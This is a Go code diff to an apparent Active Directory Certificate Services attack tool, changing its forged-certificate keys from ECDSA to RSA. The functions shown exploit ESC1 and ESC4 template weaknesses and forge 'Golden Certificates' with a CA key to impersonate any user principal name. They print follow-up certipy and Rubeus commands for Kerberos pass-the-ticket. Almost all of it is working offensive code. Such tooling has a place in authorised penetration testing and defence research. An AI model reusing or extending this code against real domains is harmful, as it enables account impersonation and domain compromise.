@@ -3,8 +3,8 @@ package pki
 import (
 	"crypto"
 	"crypto/ecdsa"
-	"crypto/elliptic"
 	"crypto/rand"
+	"crypto/rsa"
 	"crypto/tls"
 	"crypto/x509"
 	"crypto/x509/pkix"
@@ -369,7 +369,7 @@ func connectLDAP(cfg *ADCSConfig) (*ldap.Conn, error) {
 
 // ExploitESC1 exploits an ESC1-vulnerable template to forge a certificate with an arbitrary UPN.
 // Returns the forged certificate and private key — both are required for authentication.
-func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
 	fmt.Printf("[!] ESC1 Exploitation: template=%s target=%s\n", templateName, targetUPN)
 
 	// Step 1: Verify template is ESC1 vulnerable
@@ -417,14 +417,14 @@ func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	}
 	fmt.Printf("[+] Certificate obtained for %s via ESC1 on template %q\n", targetUPN, templateName)
 	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy auth -pfx %s.pfx -dc-ip %s\n", upnUser, cfg.TargetDC)
+	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
 	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
 	return cert, certKey, nil
 }
 
 // ExploitESC4 exploits WriteDacl permissions on a template to make it ESC1-vulnerable, then exploits it.
 // Returns the forged certificate and private key — both are required for authentication.
-func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
 	fmt.Printf("[!] ESC4 Exploitation: template=%s target=%s\n", templateName, targetUPN)
 
 	conn, err := connectLDAP(cfg)
@@ -493,7 +493,7 @@ func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 // WriteCertKeyPEM writes a certificate and its private key to separate PEM files at the given base path.
 // E.g., path="/tmp/victim" creates /tmp/victim.crt and /tmp/victim.key.
 // Both files are required to use the certificate for authentication (e.g., with certipy or Rubeus).
-func WriteCertKeyPEM(cert *x509.Certificate, key *ecdsa.PrivateKey, basePath string) error {
+func WriteCertKeyPEM(cert *x509.Certificate, key crypto.Signer, basePath string) error {
 	certPath := basePath + ".crt"
 	keyPath := basePath + ".key"
 
@@ -507,17 +507,17 @@ func WriteCertKeyPEM(cert *x509.Certificate, key *ecdsa.PrivateKey, basePath str
 		return fmt.Errorf("encode cert PEM: %w", err)
 	}
 
-	// Write private key PEM
-	keyDER, err := x509.MarshalECPrivateKey(key)
+	// Write private key PEM (PKCS8 handles both RSA and ECDSA)
+	keyDER, err := x509.MarshalPKCS8PrivateKey(key)
 	if err != nil {
-		return fmt.Errorf("marshal EC key: %w", err)
+		return fmt.Errorf("marshal private key: %w", err)
 	}
 	keyFile, err := os.Create(keyPath)
 	if err != nil {
 		return fmt.Errorf("create key file: %w", err)
 	}
 	defer keyFile.Close()
-	if err := pem.Encode(keyFile, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}); err != nil {
+	if err := pem.Encode(keyFile, &pem.Block{Type: "PRIVATE KEY", Bytes: keyDER}); err != nil {
 		return fmt.Errorf("encode key PEM: %w", err)
 	}
 
@@ -529,7 +529,7 @@ func WriteCertKeyPEM(cert *x509.Certificate, key *ecdsa.PrivateKey, basePath str
 // WritePFX writes a PKCS12/PFX archive containing the certificate and private key.
 // PFX files are directly consumable by certipy and Rubeus without manual conversion.
 // password can be empty string for an unencrypted PFX (acceptable for local pen-test use).
-func WritePFX(cert *x509.Certificate, key *ecdsa.PrivateKey, path, password string) error {
+func WritePFX(cert *x509.Certificate, key crypto.Signer, path, password string) error {
 	pfxData, err := pkcs12.Encode(rand.Reader, key, cert, nil, password)
 	if err != nil {
 		return fmt.Errorf("encode PFX: %w", err)
@@ -632,10 +632,10 @@ func derTLV(tag byte, value []byte) []byte {
 //
 // The UPN SAN is encoded as OtherName with OID 1.3.6.1.4.1.311.20.2.3
 // (szOID_NT_PRINCIPAL_NAME) — the format required by Windows for PKINIT.
-func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, crypto.Signer, error) {
 	fmt.Printf("[!] Forging Golden Certificate for UPN: %s\n", upn)
 
-	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	certKey, err := rsa.GenerateKey(rand.Reader, 2048)
 	if err != nil {
 		return nil, nil, fmt.Errorf("failed to generate certificate key: %w", err)
 	}
@@ -760,12 +760,12 @@ func LoadCACertAndKey(certPath, keyPath string) (*x509.Certificate, crypto.Priva
 //   - SmartCardLogon + ClientAuth EKU
 //   - Random serial number
 //   - Signed by caKey, chains to caCert
-func ForgeGoldenCertificate(caKey crypto.PrivateKey, caCert *x509.Certificate, upn string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func ForgeGoldenCertificate(caKey crypto.PrivateKey, caCert *x509.Certificate, upn string) (*x509.Certificate, crypto.Signer, error) {
 	fmt.Printf("[!] Forging Golden Certificate (CA-signed) for UPN: %s\n", upn)
 	fmt.Printf("[*] CA Subject: %s\n", caCert.Subject.CommonName)
 
 	// Generate a new key pair for the forged certificate
-	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	certKey, err := rsa.GenerateKey(rand.Reader, 2048)
 	if err != nil {
 		return nil, nil, fmt.Errorf("generate certificate key: %w", err)
 	}
